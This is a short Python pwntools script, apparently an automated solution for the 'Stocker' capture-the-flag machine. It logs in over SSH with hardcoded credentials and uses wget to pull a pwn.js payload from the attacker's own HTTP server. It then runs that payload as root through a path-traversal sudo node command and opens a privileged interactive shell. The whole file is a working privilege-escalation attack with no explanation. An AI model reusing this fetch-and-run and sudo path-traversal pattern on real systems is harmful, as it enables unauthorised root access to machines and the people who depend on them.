
import requests



try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Stocker - Ninhpn1337\n")
except:
    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
    exit(1)




def server():
    
    os.system("python3 -m http.server 8000")



threading.Thread(target=server, args=()).start()



request = ssh(host="10.10.11.196", user="angoose", password="IHeardPassphrasesArePrettySecure")
shell = request.process("/bin/sh")
time.sleep(0.5)
shell.sendline(b"/bin/bash/")
time.sleep(0.5)
shell.sendline(b"cd /home/angoose/")
time.sleep(0.5)
shell.sendline(b"wget 10.10.14.57:8000/pwn.js")
time.sleep(0.5)
shell.sendline(b"sudo node /usr/local/scripts/../../../home/angoose/pwn.js")
time.sleep(0.5)
shell.sendline(b"IHeardPassphrasesArePrettySecure")
time.sleep(0.5)
shell.sendline(b"bash -p")
time.sleep(0.5)
shell.sendline(b"whoami")
shell.interactive()
